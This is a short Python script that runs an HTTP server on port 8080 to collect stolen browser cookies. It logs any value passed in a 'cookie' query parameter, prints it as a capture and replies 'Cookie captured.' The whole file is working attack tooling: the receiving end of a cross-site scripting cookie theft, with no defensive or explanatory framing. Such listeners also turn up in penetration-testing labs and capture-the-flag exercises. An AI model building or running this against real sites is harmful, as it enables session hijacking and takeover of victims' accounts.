from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse


# HTTP Request Handler to capture cookies
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse URL query string
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        # Log cookies sent to the server
        if 'cookie' in query_params:
            captured_cookie = query_params['cookie'][0]
            print(f"[+] Captured Cookie: {captured_cookie}")
        else:
            print("[!] No cookie found in request.")

        # Send HTTP response back
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Cookie captured.")


# Server listens on port 8080
server_address = ('', 8080)
httpd = HTTPServer(server_address, RequestHandler)

print("[*] Starting server at http://localhost:8080...")
httpd.serve_forever()
